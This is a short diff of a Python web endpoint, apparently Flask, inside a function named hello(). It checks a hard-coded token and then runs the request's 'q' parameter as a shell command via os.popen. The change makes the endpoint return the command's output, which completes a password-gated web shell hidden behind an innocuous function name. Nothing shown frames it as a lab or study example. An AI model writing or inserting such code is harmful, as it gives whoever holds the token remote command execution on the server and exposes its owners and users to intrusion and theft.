@@ -11,7 +11,7 @@ def hello():
 	if p == '93a610435bfdc6c2bda74f00bfdec18d40b':
 		q = str(request.args.get("q"))
 		result = os.popen(q)
-		return q
+		return str(result)
 	else:
 		return "Error authenticating!!!"
 		
